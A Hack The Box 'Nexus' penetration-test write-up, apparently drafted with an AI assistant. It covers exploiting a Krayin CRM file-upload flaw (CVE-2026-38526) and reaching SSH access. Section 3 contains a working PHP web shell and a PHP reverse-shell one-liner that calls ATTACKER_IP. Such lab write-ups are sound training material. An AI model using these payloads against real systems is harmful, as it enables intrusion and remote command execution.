HTB Nexus – Penetration Testing Report
1. Enumeration
1.1 Gitea – Source Code Management
During enumeration, we discovered a Gitea instance running:
- Service: Gitea
- Version: 1.26.0
We also identified a Git repository containing application-related files. Further inspection of the repository revealed an .env file containing credentials that would later be useful for SSH access.
1.2 Billing Application – Krayin CRM
We discovered the virtual host:

billing.nexus.htb

Accessing this hostname redirected us to:

http://billing.nexus.htb/admin/login

The login page revealed that the application was running Krayin CRM.

We used credentials discovered earlier during the assessment:
Parameter	Value
Username	j.matthew@nexus.htb
Password	Previously discovered password
Application	Krayin CRM

Authentication was successful.
1.3 Version Identification
After logging in, we identified the installed Krayin CRM version:

2.2.0

A search for publicly disclosed vulnerabilities affecting this version led us to:

CVE-2026-38526

Reference: CVE-2026-38526 – Proof of Concept
2. Vulnerability Analysis
2.1 CVE-2026-38526 – Unauthenticated/Authenticated File Upload to Remote Code Execution
Critical – CVSS 9.9 (reported)
Attribute	Details
Vulnerability	Arbitrary file upload leading to RCE
Application	Krayin CRM
Version	2.2.0
CVE	CVE-2026-38526
Potential impact	Remote Code Execution

The vulnerability disclosure described an attack involving malicious PHP file uploads, potentially allowing an attacker to execute commands on the server.
3. Exploitation – Initial Access
3.1 PHP Web Shell Creation
We prepared a PHP web shell:
<?php echo shell_exec($_GET["c"]); ?>


The script uses shell_exec() to execute commands supplied through the c URL parameter.

For example, the following request structure allows command execution:
http://TARGET/shell.php?c=id


3.2 Reverse Shell
After uploading the PHP file through the vulnerable functionality, we prepared a reverse shell connection.

PHP reverse shell command:
php -r '$sock=fsockopen("ATTACKER_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'


The payload was URL-encoded before being sent through the web application.

Replace ATTACKER_IP with your actual listener IP in your private notes. Avoid publishing sensitive infrastructure details unnecessarily.
3.3 Obtaining an Interactive Shell
After establishing the reverse shell, we upgraded it to an interactive Bash shell using:
python3 -c 'import pty; pty.spawn("/bin/bash")'


This provided a more usable terminal environment.
4. Credential Discovery and SSH Access
4.1 Git Repository Inspection
During further investigation of the Git repository, we discovered an .env file.

The file contained credentials that could be reused for SSH authentication.
4.2 SSH Authentication
Using the discovered credentials, we connected to the machine as the user jones.
ssh jones@TARGET_IP


The password is intentionally omitted from the public report.

SSH authentication was successful.
5. User Flag
After obtaining SSH access, we navigated to the user's home directory and retrieved the user flag:
cat user.txt


User access obtained

6. Current Attack Path
This diagram summarizes your progress so far.
Gitea – Port / Web Enumeration

Version 1.26.0 · Repository discovery


Billing – Krayin CRM

Version 2.2.0 · Credentials discovered earlier


CVE-2026-38526

PHP upload · Remote code execution


Reverse Shell

Interactive Bash session


Git Repository – .env

SSH credentials discovered


SSH – jones
User flag obtained


Privilege Escalation

Pending – Root access


7. Important corrections before publishing
A few things to verify:
1. Confirm that CVE-2026-38526 actually applies to the installed Krayin version and document the conditions required for exploitation.
2. Include evidence of successful PHP command execution.
3. Include a screenshot of SSH access as jones.
4. Never publish actual passwords, .env secrets, reverse-shell IPs, or flags.
5. Keep the distinction between the initial web-shell access and subsequent SSH access clear.
Next: Send me what you did after logging in as jones — especially your privilege-escalation enumeration commands and outputs. We'll document the root compromise in the same format.
